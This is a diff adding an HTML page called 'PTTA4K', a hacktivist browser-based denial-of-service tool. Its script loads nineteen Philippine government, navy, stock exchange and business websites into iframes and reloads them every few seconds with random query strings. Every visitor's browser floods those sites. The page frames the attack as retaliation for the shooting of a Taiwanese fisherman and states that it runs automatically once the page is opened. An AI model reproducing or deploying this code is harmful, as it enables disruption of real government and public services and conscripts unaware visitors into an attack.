@@ -1,0 +1,120 @@
+﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>鍵盤開戰 PTTA4K (α)</title>
+<style type="text/css">
+h1, h2, h3 {
+	padding: 0;
+	margin: 0;
+}
+body {
+	line-height: 32px;
+	text-align: center;
+}
+</style>
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script type="text/javascript">
+var all_iframes = null;
+
+var target_domain_name = [
+	'http://www.gov.ph',
+	'http://www.coastguard.gov.ph',
+	'http://www.pse.com.ph',
+	'http://www.peza.gov.ph',
+	'http://www.neda.gov.ph',
+	'http://www.bir.gov.ph',
+	'http://www.bas.gov.ph',
+	'http://www.senate.gov.ph',
+	'http://www.navy.mil.ph',
+	'http://pmc.navy.mil.ph',
+	'http://www.dti.gov.ph',
+	'http://www.boi.gov.ph',
+	'http://www.doj.gov.ph',
+	'http://www.president.gov.ph',
+	'http://www.dti.gov.ph',
+	'http://www.taiwanoffice.org.ph',
+	'http://www.wtcmanila.com.ph',
+	'http://www.philippinechamber.com',
+	'http://www.tourism.gov.ph'
+];
+
+var get_iframe_syntax = function (domain_name) {
+	var new_height = Math.floor(50 + Math.random() * 120);
+
+	return '<iframe security="restricted" sandbox="" scrolling="no" frameborder="0" border="0" data-domain="' + domain_name + '" src="' + domain_name + '" width="100%" height="'+ new_height +'"></iframe>';
+};
+
+var refresh_website_page = function () {
+	all_iframes.each(function (i, iframe) {
+		iframe = $(iframe);
+		var domain_name = iframe.data('domain');
+		var random_token = Math.random();
+
+		var need_to_add_parameter = Math.round(Math.random());
+		var parameter = random_token.toString(16).substr(2) + '=' + random_token.toString().substr(2);
+
+		if ( need_to_add_parameter ) {
+			iframe.attr('src', domain_name + '/?' + parameter);
+		} else {
+			iframe.attr('src', domain_name);
+		}
+	});
+};
+
+$(document).ready(function () {
+	var board = $('#board');
+
+	$.each(target_domain_name, function (index, value) {
+		board.append(get_iframe_syntax(value));
+	});
+
+	all_iframes = board.find('iframe');
+
+	if ( 0 < all_iframes.length ) {
+		setInterval(refresh_website_page, 5100);
+	}
+});
+</script>
+</head>
+
+<body>
+<div>
+<h1>聽說？</h1>
+<h2>快訊／殘忍！屏東65歲漁民疑遭菲律賓軍艦以機關槍射殺</h2>
+<h2>追新聞／11年來…台菲漁船紛爭不斷　羈押、傷亡多有</h2>
+<h2>菲律賓船艦誤擊？陸媒爆：開槍事件並非偶發</h2>
+<h2>簡訊：國台辦譴責菲律賓軍艦襲擊台灣漁船</h2>
+<h2> [新聞] 馬震怒！要菲緝兇　否則不善罷甘休</h2>
+<h2> [新聞] 菲射殺台漁民 總統：追究到底</h2>
+<h2> [新聞] 台船員遭射殺 外長要求菲緝兇</h2>
+<h2> [新聞] 槍擊漁民 總統：要求懲兇賠償</h2>
+<div>鄭樟雄說，對於我國漁船在重疊經濟海域被菲律賓公務船攻擊，「痛恨及譴責」，初步查
+證，確認攻擊「廣大興28號」的是菲國公務船，船上有菲國漁政及海巡官員，開槍的是海
+巡人員，且是在海面上一路追擊，致漁船船身上有32個彈孔。</div>
+<h2>菲開34槍射殺台漁民 馬英九：不善罷甘休</h2>
+<h2> [新聞] 我漁船遭開槍　菲律賓同情「不道歉」</h2>
+<h2>為什麼菲律賓政府不儘速正式道歉跟賠償？這是什麼政府呀，幹Ｘ娘！</h2>
+<h1>幹，自己來比較快，鍵盤開戰 PTTA4K (α)</h1>
+<div>訴求目標：逼使菲律賓政府正式對台灣道歉，並賠償受害家屬</div>
+<div>網站關閉日期：訴求目標達成</div>
+<div>怎麼用？：你開啓這個網站時就已經在動了</div>
+<pre>
+</pre>
+</div>
+<div id="board"></div>
+
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-40794971-1']);
+_gaq.push(['_trackPageview']);
+
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+</body>
+</html>
